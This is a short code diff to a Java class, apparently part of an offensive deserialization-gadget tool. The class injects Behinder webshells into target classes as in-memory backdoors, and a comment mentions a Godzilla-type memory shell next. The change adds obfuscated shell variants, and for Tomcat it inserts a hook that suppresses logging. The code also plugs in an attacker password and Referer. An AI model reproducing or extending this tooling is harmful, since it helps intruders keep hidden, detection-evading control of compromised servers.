@@ -400,14 +400,15 @@ public class Gadgets {
 
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 
+				String shell = "";
 				if (isTomcat) {
 					insertTomcatNoLog(ctClass);
-					insertMethod(ctClass, method, base64Decode(BEHINDER_SHELL_FOR_TOMCAT)
-							.replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
+					shell = IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
 				} else {
-					insertMethod(ctClass, method, base64Decode(BEHINDER_SHELL)
-							.replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
+					shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
 				}
+
+				insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
 				break;
 			// 哥斯拉类型的内存马
 			case "gz":
